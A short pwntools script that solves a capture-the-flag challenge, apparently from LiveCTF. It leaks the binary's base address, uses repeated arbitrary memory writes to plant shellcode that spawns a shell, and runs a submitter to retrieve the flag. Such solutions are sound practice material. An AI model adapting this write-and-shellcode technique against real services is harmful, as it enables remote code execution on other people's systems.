from pwn import *
import time
do_it_live = True

if do_it_live:
    HOST = os.environ.get('HOST', 'localhost')
    PORT = 31337
    io  = remote(HOST, int(PORT))
else:
    io = process('./challenge')

elf = ELF("./challenge", checksec=False)
context.binary = elf

def u64v(b: bytes) -> int:
    return u64(b.ljust(8, b'\x00'))


elf.address = u64(io.recv(8))
print("elf:", hex(elf.address))

payload = asm(shellcraft.amd64.sh())

def u64v(b: bytes) -> int:
    return u64(b.ljust(8, b'\x00'))

io.write(p64(elf.address + 0x4330) + p64(elf.address+0x1370))
io.write(p64(elf.address + 0x4338) + p64(elf.address+0x2000))
io.write(p64(0))
io.write(p32(0))

for i in range(0, len(payload), 8):
    addr = elf.address + 0x2158 + i
    io.send(p64(addr))
    io.send(p64(u64v(payload[i:i+8])))

io.write(p64(0))

time.sleep(0.5)
io.sendline(b"./submitter")

io.recvuntil("LiveCTF")
io.unrecv("LiveCTF")

flag = io.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)
io.close()

